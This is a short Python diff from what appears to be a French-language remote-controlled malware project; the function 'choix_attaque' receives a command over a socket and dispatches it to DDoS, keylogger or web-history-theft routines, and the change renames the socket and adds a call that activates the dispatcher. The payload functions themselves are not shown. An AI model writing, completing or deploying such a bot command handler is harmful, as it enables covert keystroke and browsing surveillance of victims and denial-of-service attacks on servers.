@@ -51,7 +51,7 @@ def historiqueWeb():
 
 #choix de l'attaque en fonction du message reçu
 def choix_attaque():
-    attaque = s.recv(1024)
+    attaque = distant_socket.recv(1024)
     if (attaque == b"ddos") :
         return ddos(server_add)
     elif (attaque == b"keylogger"):
@@ -59,7 +59,7 @@ def choix_attaque():
     elif (attaque == b"historique"):
         return historiqueWeb()
 
-#fonction pour lancer le logging
+choix_attaque()
 
 
 
